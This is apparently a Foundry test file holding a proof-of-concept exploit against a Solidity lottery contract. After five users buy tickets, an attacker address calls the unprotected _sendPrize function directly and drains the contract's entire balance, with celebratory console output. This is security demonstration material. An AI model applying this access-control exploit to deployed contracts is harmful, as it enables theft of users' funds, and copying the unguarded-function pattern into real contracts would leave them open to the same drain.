// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import "../src/Lottery.sol";

contract ProofOfConcept is Test {
    LotterySystem public lotteryContract;

    address public owner = address(this);
    address public user1 = vm.addr(10);
    address public user2 = vm.addr(20);
    address public user3 = vm.addr(30);
    address public user4 = vm.addr(40);
    address public user5 = vm.addr(50);
    address public attacker = vm.addr(60);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);
        vm.deal(user5, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(owner);
        lotteryContract = new LotterySystem();
    }

    function test_exploit() public {
        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(
            unicode"\n\tSimulating ticket purchases by different lottery participants\n"
        );
        console.log(
            "-------------------------------------------------------------------------------"
        );

        vm.prank(owner);
        lotteryContract.startLottery(1 ether);

        buyTicket(user1, 1 ether, 1);
        buyTicket(user2, 1 ether, 1);
        buyTicket(user3, 1 ether, 1);
        buyTicket(user4, 1 ether, 1);
        buyTicket(user5, 1 ether, 1);

        console.log(
            "-------------------------------------------------------------------------------\n"
        );
        console.log(
            unicode"| => Funds in lottery (contract's balance) : 👀 %s ether",
            address(lotteryContract).balance / 1 ether
        );
        console.log(
            unicode"| => Attacker's balance                    : 👀 %s ether\n",
            address(attacker).balance / 1 ether
        );
        console.log(
            "-------------------------------------------------------------------------------"
        );

        console.log(unicode"\n\t\t\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n");

        exploit();

        console.log(
            "-------------------------------------------------------------------------------\n"
        );
        console.log(
            unicode"| => Funds in lottery (contract's balance) : ☠  %s ether",
            address(lotteryContract).balance / 1 ether
        );
        console.log(
            unicode"| => Attacker's balance                    : 💯 %s ether\n",
            address(attacker).balance / 1 ether
        );
        console.log(
            "-------------------------------------------------------------------------------"
        );
    }

    function buyTicket(address user, uint amount, uint lotteryId) internal {
        vm.prank(user);
        lotteryContract.buyTicket{value: amount}(lotteryId);
        console.log(
            unicode"| => Address: %s bought a ticket for %s ether |",
            user,
            amount / 1 ether
        );
    }

    function exploit() internal {
        vm.startPrank(attacker);

        uint256 contractBalance = address(lotteryContract).balance;
        lotteryContract._sendPrize(payable(attacker), contractBalance);

        vm.stopPrank();
    }
}
